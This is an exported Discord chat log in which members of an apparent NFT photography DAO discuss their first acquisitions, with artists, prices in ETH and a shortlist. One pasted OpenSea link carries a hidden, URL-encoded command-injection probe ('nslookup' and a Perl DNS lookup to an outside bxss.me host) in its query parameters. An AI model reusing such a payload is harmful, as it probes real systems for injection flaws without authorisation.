AuthorID,Author,Date,Content,Attachments,Reactions
"474046746163412993","Freddie#0100","2021-11-29","This hit Superrare yesterday. Reuben for me checks all the boxes. Prices that is going up quickly and innovative beautiful work
https://superrare.com/artwork-v2/%F0%9F%92%8Ethe-sea-of-ice-%F0%9F%92%8E-30756","","💯 (1)"
"802980996114415648","justinaversano.eth#9406","2021-11-29","Atleast get our critical eye working","",""
"869997214221623296","foto.eth#8472","2021-11-29","I suppose one strategy could be to collect some ""foundational pieces"" in terms of photography in the nft space and at the same time some more ""emerging voices"" in the space who don't necessarily need to be emerging artists, but work that we see as really important to the space, museum-quality, perhaps work that dialogues with technology somehow / feels relevant content-wise for the space. it's a clean two-tiered strategy to articulate that i think could really outline who we see ourselves as - creating a history of this space while also supporting new entrants","","🧠 (4)"
"869997214221623296","foto.eth#8472","2021-11-29","this basically support's @Freddie 's comments and then can reflect some of the artists being added to the collaborative spreadsheet","","👍 (1)"
"474046746163412993","Freddie#0100","2021-11-29","I think that is a very well articulated strategy that makes sense","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","What are some examples so we can see what we are talking about","",""
"869997214221623296","foto.eth#8472","2021-11-29","I think examples of foundational pieces would be a TF, Carpoolers, and Reuben Wu","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Laurent chevalier is a great artist on foundation","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","https://opensea.io/thebottomlesseye?tab=created","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Who are some of the leading women in the space ?","",""
"869997214221623296","foto.eth#8472","2021-11-29","I'm not sure there are any ""foundational"" women as of right now (very unfortunately) - what do you think?","",""
"869997214221623296","foto.eth#8472","2021-11-29","In terms of newcomers to the space, I think Penelope Umbrico and Amy Elkins are great starts. We already have CDM which is fantastic.","",""
"869997214221623296","foto.eth#8472","2021-11-29","you made a suggestion on the spreadsheet, @justinaversano.eth  for someone. can you elaborate on that here?","",""
"474046746163412993","Freddie#0100","2021-11-29","I'd add summer wagner to newcomers that I am a fan of. https://foundation.app/@summerwagner","",""
"474046746163412993","Freddie#0100","2021-11-29","Looking now. Would it be unethical of me to kick off an auction right now? I won't do it if it's questionable","",""
"869997214221623296","foto.eth#8472","2021-11-29","if the three mentioned prior are part of a foundational strategy then it would make sense to have 3 women to balance that out, so long as the quality is stellar and in line with our goal of excellence","",""
"869997214221623296","foto.eth#8472","2021-11-29","ah yes, missed this. this is a great suggestion!","",""
"869997214221623296","foto.eth#8472","2021-11-29","oh, I also think Kris Graves is a foundational artist - he's been in the space from the beginning","","💯 (1)"
"869997214221623296","foto.eth#8472","2021-11-29","mayve something from The Testament Project https://opensea.io/collection/the-testament-project","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Penelope umbrico","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","And Diana Sinclair","",""
"474046746163412993","Freddie#0100","2021-11-29","Cath Simard could be foundational though it's not for me personally","",""
"869997214221623296","foto.eth#8472","2021-11-29","right, that's who was new to me. Can you link to it here?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I already own one of his works","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","If you look at TwinFlames vault on OpenSea that’s my entire photo collection of what I’ve been buying all year as a good inspiration","","cheers (2)"
"802980996114415648","justinaversano.eth#9406","2021-11-29","I agree. More for her name than the work","",""
"474046746163412993","Freddie#0100","2021-11-29","yup","",""
"474046746163412993","Freddie#0100","2021-11-29","prices certainly are impressive","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","She’s huge in the nft space leading female artist","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Photographer 17 year old and co-founder of herstory DAO","","💙 (2)"
"802980996114415648","justinaversano.eth#9406","2021-11-29","They support black women artists","",""
"827362797792788520","hddamico#7928","2021-11-29","agree we should have a kick off call","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I think we should snap up that Ruben wu piece though","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Good strong signal for first buy","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Delphine Diallo is doing her genesis at art Basel , it’s a triptych. Could be a good buy too","","💯 (1)"
"474046746163412993","Freddie#0100","2021-11-29","I bid on a Laurent chevalier. If anyone has issues since he was brought up here, I will happily donate it to the dao","",""
"869997214221623296","foto.eth#8472","2021-11-29","love this one: https://foundation.app/@dianaesinclair/~/71666","","fire (2)"
"802980996114415648","justinaversano.eth#9406","2021-11-29","She’s the best. Crypto native and a leader for women and black artist in the space","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I nominated her time piece too","","💯 (1)"
"869997214221623296","foto.eth#8472","2021-11-29","great suggestion","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","There’s also Karena Gabrielle","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","She makes amazing portraits / still life’s","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","https://foundation.app/@KIBAPTISTE","",""
"474046746163412993","Freddie#0100","2021-11-29","How do we deal with great artists but where the relevant pieces aren't listed?","",""
"371604298272079874","blockbird#2283","2021-11-29","Do we have the funds ready to deploy at this point?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Contact them and buy for DAO without bids and stuff","","cheers (1)"
"869997214221623296","foto.eth#8472","2021-11-29","these are nice - I do think we need a balance though in terms of nft native and traditional fine art-native artists, no?","",""
"474046746163412993","Freddie#0100","2021-11-29","I think Diana's best work isn't for sale","",""
"869997214221623296","foto.eth#8472","2021-11-29","can we place offers?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Let’s make a list of 5 traditional and 5 nft native to start","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Just to layout a plan and vision board","","👍 (3)"
"371604298272079874","blockbird#2283","2021-11-29","i guess in terms of placing offers we run the risk of signalling our interest in that piece + collection","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","@DT | Luiz","",""
"371604298272079874","blockbird#2283","2021-11-29","great call","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","We talk to artist directly","","👍 (1)"
"802980996114415648","justinaversano.eth#9406","2021-11-29","Without signaling bids","","💯 (1)"
"802980996114415648","justinaversano.eth#9406","2021-11-29","And if we plan on bidding for raw DAO. I think a random wallet, or one of us buys it then gets reimbursed by the DAO","","👌 (1)"
"371604298272079874","blockbird#2283","2021-11-29","If the funds aren't available, I'm happy to proxy bid/buy and transfer to the dao once they are","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","What does everyone think about rubens piece?","","💯 (2)"
"371604298272079874","blockbird#2283","2021-11-29","I like it, v strong","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I think it would be a great first buy. How about you all?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","His work is very scarce","",""
"474046746163412993","Freddie#0100","2021-11-29","I'm all about Reuben. Just sad it isn't for my personal collection lol","",""
"371604298272079874","blockbird#2283","2021-11-29","Previous sales in the 16 to 27 eth range","",""
"371604298272079874","blockbird#2283","2021-11-29","we offer 20 maybe?","",""
"371604298272079874","blockbird#2283","2021-11-29","Does anyone have a line to him to have a convo about it?","",""
"474046746163412993","Freddie#0100","2021-11-29","I'd assume @alexcartagenamex has since he is releasing with Obscura","",""
"474046746163412993","Freddie#0100","2021-11-29","Also, just to act as a devil advocate regardless of my love for his work. Are we sending the right signal buying landscape photography as the first item or does that not matter?","",""
"869997214221623296","foto.eth#8472","2021-11-29","What's your concern with that? I think so long as the full initial collection isn't entirely landscape, it's fine. And, we'll have the opportunity to articulate the reasoning for these acquisitions and can explain the strategy well for this round.","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I do","",""
"869997214221623296","foto.eth#8472","2021-11-29","I think we basically need to think of our first acquisitions almost like an exhibition ""This is NFT photography"" and ensure it's well-rounded, historically-important, lasting work","",""
"371604298272079874","blockbird#2283","2021-11-29","I guess in terms of inclusion, we need to think traditional vs nft, but also genre too? like, we shouldn't get too heavy on one genre?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I think his work transcends “landscape”","",""
"371604298272079874","blockbird#2283","2021-11-29","agree","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","And is a great buy for us as a DAO with thinking the digital illumination NFTs bring","",""
"869997214221623296","foto.eth#8472","2021-11-29","yes, we need diversity in every respect, genre, background, approach, content","",""
"474046746163412993","Freddie#0100","2021-11-29","It is not a concern per se but I do think most uninformed collectors gravitate towards landscape which I think is a shame. I'd personally like the guide them towards fine art. I do think that Reuben's work transcends as Justin just wrote","",""
"474046746163412993","Freddie#0100","2021-11-29","Completely agree","",""
"474046746163412993","Freddie#0100","2021-11-29","Just want to make sure we consider everything:)","","💙 (1)"
"371604298272079874","blockbird#2283","2021-11-29","I also think we need a presence with documentary + photojournalism (cos it's my fav, lol)","","this (2)"
"869997214221623296","foto.eth#8472","2021-11-29","can we set a target date for maybe 3 acquisitions that's really soon, like this week, so it's less of a prominent statement about reuben and landscape, etc, and is more about ""foundations"" or something like that?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Maybe we make a list of 5 and 5 native and traditional. Each 5 can be landscape, portraits, documentary, etc","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I’m for this","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Another question is. What’s the timeline when deploying the 120 eth for collecting for this first round?","",""
"371604298272079874","blockbird#2283","2021-11-29","nice! let's get it. what do you think? start at 20 and see if he's happy?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Let me ask him?","",""
"371604298272079874","blockbird#2283","2021-11-29","good question, might need @DT | Luiz for that?","",""
"371604298272079874","blockbird#2283","2021-11-29","actually is he in here? @lucaspon can you add @DT | Luiz ?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","As for Japanese photography @hddamico whaleshark was promoting this guy","",""
"389803426877407232","lucaspon#3865","2021-11-29","he's in here","","🙏 (1)"
"802980996114415648","justinaversano.eth#9406","2021-11-29","","https://cdn.discordapp.com/attachments/908076537381797898/915008419000377394/IMG_1957.png",""
"371604298272079874","blockbird#2283","2021-11-29","yep, I think so. unless we need more unanimous support. do we emoji vote those things? or vote properly?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","20 eth? Or less","",""
"474046746163412993","Freddie#0100","2021-11-29","His last couple of pieces went for 27E ish","",""
"869997214221623296","foto.eth#8472","2021-11-29","I think we really should get everyone's vote on this","","vhigh (2)"
"474046746163412993","Freddie#0100","2021-11-29","agree. big first buy","",""
"371604298272079874","blockbird#2283","2021-11-29","i've followed him for a long time on IG. tbh, I think he's not as strong as his reputation implies (personal view) but he's very, very popular. 1.8m followers on IG, features on NatGeo almost weekly","",""
"371604298272079874","blockbird#2283","2021-11-29","i guess that's always the question. there will be some who are happy to maybe accept less to be in particular collections or to build relationships, but we need to show respect to their expected pricing also? i'm not too familiar with this. you must have had to wade thru this a bit with TF @justinaversano.eth ?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Brokered many deals with twin flames","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","It always came down to the price people paid and what the collector would let it go for","",""
"371604298272079874","blockbird#2283","2021-11-29","okay, that's fair. So yeah, pitch lower then. I mean we could start at his lowest previous sale price which i think was 16e?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","This can be helpful for diversity https://twitter.com/i/events/1465411567445430276?s=21","","fire (1)"
"802980996114415648","justinaversano.eth#9406","2021-11-29","I’ll ask 15 eth. If your all cool with that","","👍 (1)"
"371604298272079874","blockbird#2283","2021-11-29","yep!","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Let’s wait till the rest of the votes come in from the committe","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Spoke to Reuben this is what he said","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Hey Justin, that's amazing to hear! So this new one is showing at @SCOPEArtShow tomorrow and I was planning to set the reserve at 33E on opening of the show. I didn't have a specific number in mind but 33 is my lowest, hence the reserve.","",""
"371604298272079874","blockbird#2283","2021-11-29","yikes","",""
"371604298272079874","blockbird#2283","2021-11-29","okay, lol","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Next","",""
"371604298272079874","blockbird#2283","2021-11-29","i'm going to painfully dig thru natgeo and magnum photographers to see if any are putting their toe in the nft water, would be great to get someone early for an early trad buy","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Delphine Diallo genesis piece at art Basel will be like 8-10 eth","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Share here what you find","",""
"371604298272079874","blockbird#2283","2021-11-29","i guess there's still a lot of perceived reputation risk for many photographers - environment, nfts are the devil, scam, etc, etc","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","YOLO","",""
"371604298272079874","blockbird#2283","2021-11-29","lol","",""
"371604298272079874","blockbird#2283","2021-11-29","YOLO","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","He wants 33","",""
"371604298272079874","blockbird#2283","2021-11-29","this looks strong to me - very striking work","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","We are doing a quantum drop with her dec 30 too","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Not sure if that is a conflict","",""
"474046746163412993","Freddie#0100","2021-11-29","I would abstain from a vote since I own one but would love for the dao to own a Roe Ethridge at some point. https://opensea.io/collection/roe-ethridge","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","She’d be a great candidate. Black female artist is our first purchase sends a strong signal","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Oh shit roe made NFTs?!","",""
"371604298272079874","blockbird#2283","2021-11-29","lol","",""
"474046746163412993","Freddie#0100","2021-11-29","only 3","",""
"371604298272079874","blockbird#2283","2021-11-29","i got declined for a nudey photo","",""
"474046746163412993","Freddie#0100","2021-11-29","very under the radar","",""
"371604298272079874","blockbird#2283","2021-11-29","come on discord, don't be like that","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","When?!","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Damn I wish I knew","",""
"371604298272079874","blockbird#2283","2021-11-29","","https://cdn.discordapp.com/attachments/908076537381797898/915015875508203530/Screen_Shot_2021-11-30_at_12.06.15.png",""
"474046746163412993","Freddie#0100","2021-11-29","2 months ago","",""
"474046746163412993","Freddie#0100","2021-11-29","couldn't beieve I got it for 3.5","",""
"474046746163412993","Freddie#0100","2021-11-29","lol","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Hot damn","",""
"827362797792788520","hddamico#7928","2021-11-29","👀 would look into this as a “call option”. 

not expensive, some technique, 50k followers most in Asia.","",""
"827362797792788520","hddamico#7928","2021-11-29","what do you think?","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I saw whale shark buy and promote him. Might be hype or it might be something","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Not my first choice but thought I’d share since you mentioned Japanese photography","",""
"827362797792788520","hddamico#7928","2021-11-29","sorry for the dumb question who is the whale shark?","",""
"474046746163412993","Freddie#0100","2021-11-29","collector","",""
"827362797792788520","hddamico#7928","2021-11-29","oh tks 🙂","",""
"371604298272079874","blockbird#2283","2021-11-29","","https://cdn.discordapp.com/attachments/908076537381797898/915016405752115270/IMG_4390.png",""
"371604298272079874","blockbird#2283","2021-11-29","as i mentioned - definitely v popular","",""
"371604298272079874","blockbird#2283","2021-11-29","neither","",""
"474046746163412993","Freddie#0100","2021-11-29","but like the above shared work","",""
"371604298272079874","blockbird#2283","2021-11-29","","https://cdn.discordapp.com/attachments/908076537381797898/915016735730585731/Screen_Shot_2021-11-30_at_12.09.34.png","💚 (1)"
"371604298272079874","blockbird#2283","2021-11-29","shot on the right of Delphine's is super strong","",""
"371604298272079874","blockbird#2283","2021-11-29","discord wouldn't let me share the image alone! lol","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","We get the triptych","","fire (2)"
"802980996114415648","justinaversano.eth#9406","2021-11-29","If we win her auction","","👀 (2)"
"802980996114415648","justinaversano.eth#9406","2021-11-29","They’re asking 8-10 eth","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Actually I think flamingo already got it","",""
"371604298272079874","blockbird#2283","2021-11-29","damn, fast times in photo nft life","",""
"371604298272079874","blockbird#2283","2021-11-29","i guess we do need to act quickly","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Yes","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","What’s our first purchase going to be? Maybe we strategize price and what would signal strong","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Is 33 eth to much for first purchase?","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","I do","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","just catching up. sorry","",""
"474046746163412993","Freddie#0100","2021-11-29","I don't think so. In a year that will have been cheap imo","",""
"474046746163412993","Freddie#0100","2021-11-29","and it does send a strong signal","",""
"371604298272079874","blockbird#2283","2021-11-29","i think 33 is prob too much in one photo given our 120e budget? altho i don't know what timeline's expected for that. Agree that it's worth 33 eth, I wouldn't feel concerned in that respect","",""
"371604298272079874","blockbird#2283","2021-11-29","all good! we're just debating on whether to buy Reuben's piece. he's looking at a 33 eth reserve","","💯 (1)"
"371604298272079874","blockbird#2283","2021-11-29","other thoughts were having a list of 5 trad and 5 nft photographers to purchase from initially","",""
"371604298272079874","blockbird#2283","2021-11-29","also to buy 3 strong pieces quickly to make a statement","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I’m down for the Reuben piece. I think it’s a strong signal. And at the same time we can collect 10 other photographers at .5-1 eth each or so to balance it out as another strong signal to support the little guys","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","So let’s say we spend 50 eth. 33 on Reuben and 12 on 10-12 photographers. From the jump. We still have 70 eth to work with","","👍 (1)"
"371604298272079874","blockbird#2283","2021-11-29","This is Yamashita’s OS collection… https://opensea.io/collection/yamashita-gan","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Should we set a deadline to make a purchase?","",""
"827362797792788520","hddamico#7928","2021-11-29","we should have a quick call tomorrow or wednesday","","👍 (2)"
"371604298272079874","blockbird#2283","2021-11-29","I think so - I think we want to show members we plan to make things happen","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","@alexcartagenamex what do you think?","",""
"371604298272079874","blockbird#2283","2021-11-29","Oh sorry, this is GAN photo work. Not what I thought. Although interesting actually","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","Agreed on the Reuben. Also like the Delphine pieces.","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","We should act in concert. Have all the pieces decided and do in one go","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","Putting together a small list for here","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","one sec","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","https://opensea.io/collection/sercematki

https://foundation.app/@chadwicktyler

https://opensea.io/collection/matthewporter-theheights?embed[0]=%28nslookup%20hitgrfuuhzkoz34f08.bxss.me%7C%7Cperl%20-e%20%22gethostbyname%28%27hitgrfuuhzkoz34f08.bxss.me%27%29%22%29&embed[1]=98991%2A97996%2A98991%2A97996","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","these three collections are good low-mid range","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I agree on Matthew","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Have one myself","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","Yep","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","https://opensea.io/collection/hundocubanos I hold several of these","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Same. Love those","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Big yes on Claudia","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","These are interesting too. Also hold some of them https://opensea.io/collection/ptcolorgraphs","",""
"371604298272079874","blockbird#2283","2021-11-29","I have two of Matthews, also strong agree there","",""
"474046746163412993","Freddie#0100","2021-11-29","Love Claudia! She triggered me to get a foundry pass lol","","💯 (1)"
"474046746163412993","Freddie#0100","2021-11-29","I also own matthews","",""
"474046746163412993","Freddie#0100","2021-11-29","and chadwick","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","https://foundation.app/@mich_viljoen

https://foundation.app/@jjasonchambers

Also hold some of these","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","This is fucking hard!","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","hahahahaha","",""
"371604298272079874","blockbird#2283","2021-11-29","it's only gona get harder too, lol!","",""
"474046746163412993","Freddie#0100","2021-11-29","LOL, I almost triggered this one last night. https://foundation.app/@mich_viljoen/~/111851","","🖤 (1)"
"817469690347257877","alexcartagenamex#4215","2021-11-29","https://tenor.com/view/shark-shark-week-surprise-swim-swimming-gif-14850096","","😆 (2)"
"371604298272079874","blockbird#2283","2021-11-29","i've looked at it too! maybe that says something","","👍 (2)"
"371604298272079874","blockbird#2283","2021-11-29","if we've both been close","",""
"371604298272079874","blockbird#2283","2021-11-29","love jason chambers' vibe also","",""
"827362797792788520","hddamico#7928","2021-11-29","i like GP from chad very very much","","👍 (2)"
"474046746163412993","Freddie#0100","2021-11-29","Yup. I've been coming back to it for a few weeks now","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Kris graves first project https://opensea.io/assets/0x495f947276749ce646f68ac8c248420045cb7b5e/10691109686083431502166818963425883962656955232587770388242978577753105760257","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I can get this one cheap. I know the owner","","👀 (3)"
"371604298272079874","blockbird#2283","2021-11-29","was gona say, maybe price is too high, but if you've got an in!","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","yeah I like these portraits","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I can get it for 5-10 eth","","fire (1)"
"802980996114415648","justinaversano.eth#9406","2021-11-29","One of my old Twinflames collectors who needs fast liquid","",""
"371604298272079874","blockbird#2283","2021-11-29","Could we do that sale privately, so as to not publicize the price? Send the artist royalty separately","",""
"371604298272079874","blockbird#2283","2021-11-29","I guess the DAO needs to be informed either way, so that's more or less public","",""
"371604298272079874","blockbird#2283","2021-11-29","Just thinking about protecting the artist's floor price there","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","I don’t think he’ll mind","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","She only knows how to take offers on OpenSea","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","She’s not big in tech , it’s a traditional art world collector","",""
"371604298272079874","blockbird#2283","2021-11-29","okay, all good then 👍","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","So how we looking so far? 

-Reuben
-Kris
-Michelle
-Claudia
-Matthew Porter
-Chadwick","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","-Julie Blackmon","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","-Carpoolers
-Penelope Umbrico
-Karena Gabrielle
-Amy Woodward
- Jessica Cardilucci
-Summer Wagner
-Mickey Smith","",""
"869997214221623296","foto.eth#8472","2021-11-29","Love Julie and her work, have known her for years.","",""
"474046746163412993","Freddie#0100","2021-11-29","I bought 4 from the recent drop so I'm a fan","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Penelope umbrico","",""
"869997214221623296","foto.eth#8472","2021-11-29","I think on our call we should discuss each on this shortlist","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","Here are a few more:","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","https://opensea.io/collection/second-glance

https://foundation.app/@brettcodyrogers

https://foundation.app/@Joeythephotographer

https://foundation.app/@jjasonchambers","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Can you list 5 more women?","",""
"817469690347257877","alexcartagenamex#4215","2021-11-29","yes. on it","",""
"802980996114415648","justinaversano.eth#9406","2021-11-29","Also, what are your thoughts on twin flames? I don’t want to create a conflict of interest or take too much away from the pool. But if it came a to vote for another provisional committee I can get them cheaper for us. Not saying we should get one. The offer is there","",""
